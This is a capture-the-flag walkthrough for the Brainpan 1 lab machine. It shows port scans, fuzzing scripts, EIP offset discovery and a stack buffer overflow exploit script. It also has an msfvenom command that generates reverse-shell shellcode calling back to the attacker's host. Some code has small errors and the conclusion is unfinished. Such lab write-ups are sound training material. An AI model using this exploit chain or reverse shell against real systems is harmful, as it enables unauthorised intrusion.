# Brainpan 1 Walkthrough
Following is the outcome of my hacking handiwork and obtaining root

## 1. Initial Scan

`nmap -sV -sT -v -p- -T4 192.168.56.1/24`

```
Scanning 192.168.56.106 [65535 ports]
Discovered open port 9999/tcp on 192.168.56.106
Completed Connect Scan at 14:46, 2.04s elapsed (65535 total ports)
Initiating Service scan at 14:46
Scanning 1 service on 192.168.57.1
Completed Service scan at 14:46, 6.13s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 192.168.57.1
NSE: Script scanning 192.168.57.1.
Initiating NSE at 14:46
Completed NSE at 14:46, 0.01s elapsed
Initiating NSE at 14:46
Completed NSE at 14:46, 0.01s elapsed
Nmap scan report for 192.168.57.1
Host is up (0.000064s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE VERSION
9999/tcp open  abyss?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.80%I=7%D=3/4%Time=5E5FB12A%P=x86_64-pc-linux-gnu%r(NUL
SF:L,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|\
SF:x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x
SF:20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x2
SF:0\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2
SF:0\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2
SF:0\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|\
SF:x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2
SF:0_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2
SF:0_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x2
SF:0\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_\
SF:|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x2
SF:0_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x2
SF:0_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x2
SF:0THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20>>\x20");
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.32
OS details: Linux 2.6.32
Uptime guess: 8.367 days (since Tue Feb 25 05:58:00 2020)
Network Distance: 0 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
```

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/welcome-to-brainpan.png)

`nikto -h 192.168.56.106`

* custom application on port 9999
* python SimpleHTTPServer on port 10000

**Nikto** might be helpful at this moment

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/nikto-scan-output.png)

It tells us about the `bin` directory
Let's browse the website and look inside it

`192.168.56.106:10000/bin/`

A suspicious app binary is waiting there for us - maybe it's the key for solving this puzzle? 

We won't know unless we check it out. Let's run the `strings` command to view the hardcoded strings within the binary

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/strings-output.png)

The `shitstorm` line instantly draws the attention - it may be a password to a certain service!
We are gonna give it a try:

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/192.168.56.106:9999.png)

It looks useless. I also used telnet but still nothing, the application responded with the following: Connection closed by foreign host.

The app behaves as if it were a kind of a server. After opening the socket it waits for connection, checks the input and then closes.

## 2. Fuzzing

Preinstalled Immunity Debugger on Windows 32-bit VM may come in handy here.

**In the first round** we're gonna send a long, repeated string of A's with a simple fuzzer visible below. By running the script, the terminal will tell us whether providing sufficiently long input can crash the app:

```
import socket

for i in range(30):
  s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
  s.connect(("192.168.56.105",9999) # mind to change the IP address :-)
  payloaod = int(i)*("A"*100)
  s.send(payload+"\r\n")
  print "[*] Sending buffer data with " + str(len(str(payload))) + " A's\r\n"
  s.close()
```

Running the code provides us with the following output:

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/python-fuzzer-output.png)

Turns out that the overflow occurs around the length of 900 A's.

In Immunity we notice that the EIP has been overwritten with 41414141 (hexadecimal representation of four A's). It also says that an *Access violation* occurs while executing the code at address 41414141.

As the vulnerability is known and it's obvious that we've gained control over replacing the EIP address, it brings us closer to our goal.

Firstly, we need to find the offset that could control the EIP. We're gonna utilize a Metasploit feature and create a pattern consisting of a set of unique, three-character substrings: 

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/pattern-create-ruby.png)

It spits out a unique and random set that perfectly fits to our payload.
```
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.56.105',9999))

payload = ("Put the pattern here")

print s.recv(1024)
s.send(payload)
print s.recv(1024)

s.close()
```
Execution of the script causes *Access violation* again and leads to crash:

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/overwriting-eip.png)

As you can see above, the pattern inside the EIP is **35724134**

After having the pattern located inside the instruction pointer (EIP), let's determine the offset (known as the exact location of the address) and make it point to our malicious shellcode.

`ruby pattern_offset.rb -q 35724134`

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/pattern-offset-ruby.png)

Exactly 524 bytes of junk is needed to get us to the EIP.

Now our payload will look like this: `"A"*524+"B"*4+"C"*(900-524-4)`

```
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.56.105',9999))

payload = "A"*524 + "B"*4 + "C"*(900-524-4)

print s.recv(1024)
s.send(payload+"\r\n")
print s.recv(1024)

s.close()
```
After executing this script the EIP gets overwritten with 42424242

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/Access-violation-42424242.png)

## 3. Setting JMP ESP address and shellcode

`!mona jump -r ESP`

`0x31170000` <- module with no SafeSEH and ASLR protection

`msfvenom -p windows/shell_reverse_tcp lhost=192.168.56.101 lport 443 -f c -o shellcode.txt -b "\x00"`


```
import socket

buf = ("\xb8\xf9\...\...\...\..."
"\xc9\xb1\...\..\...\...\...\..."
"...
"...
...
"\x92\x7c\xa6\xf6") 

payload = "A"*524 + "\xf3\x12\x17\x31" + "\x90"*16 + buf
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
  s.connect(('192.168.56.106',9999))
except:
  print "Error"
  sys.exit(0)

s.recv(1024)
s.send(payload)
```

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/nc-nlvp-4444.png)


![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/generating-shellcode.png)

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/root%40brainpan.png)

## Conclusion and benefits
It was an opportunity to improve
- scripting skills
- 
